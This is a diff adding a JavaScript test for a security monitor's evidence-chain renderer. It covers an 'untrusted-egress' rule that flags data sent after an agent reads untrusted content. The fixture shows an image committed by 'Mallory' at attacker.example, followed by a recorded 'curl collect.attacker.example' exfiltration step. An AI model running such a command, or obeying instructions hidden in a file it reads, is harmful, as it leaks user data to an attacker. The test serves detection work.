@@ -285,6 +285,23 @@ test('chain: proxy violation renders inspection → destination → verdict', ()
   assert.equal(nodes[1].label, 'logs.example.com:443');
 });
 
+test('chain: untrusted-egress renders each input with its origin → send → verdict', () => {
+  const nodes = buildEvidenceChain({
+    rule: 'untrusted-egress', severity: 2,
+    evidence: [
+      { kind: 'untrusted-input', label: 'Image: /work/repo/docs/build-spec.png', sub: 'committed by Mallory <mallory@attacker.example> in repo@c405510 on 2026-10-28 (docs: add build spec diagram)', rule: 'image', ts: '2026-10-28T19:57:24Z' },
+      { kind: 'send', label: 'curl collect.attacker.example', sub: 'ran; monitor mode records it', rule: 'monitored', ts: '2026-10-28T19:57:25Z' },
+    ],
+  });
+  assert.equal(nodes.length, 3);
+  assert.deepEqual([nodes[0].cls, nodes[1].cls, nodes[2].cls], ['cn-read', 'cn-egress', 'cn-verdict-warn']);
+  assert.equal(nodes[0].label, 'Image: /work/repo/docs/build-spec.png');
+  assert.match(nodes[0].sub, /^committed by Mallory <mallory@attacker\.example> in repo@c405510 on 2026-10-28 \(docs: add build spec diagram\) · \d{2}:\d{2}:\d{2}$/);
+  assert.equal(nodes[1].label, 'curl collect.attacker.example');
+  assert.match(nodes[1].sub, /^ran; monitor mode records it · /);
+  assert.equal(ctx.RULE_TITLES['untrusted-egress'], 'Data sent after reading untrusted content');
+});
+
 test('chain: keychain access / CLI / TCC structured items', () => {
   const kc = buildEvidenceChain({
     rule: 'keychain-access', severity: 2,
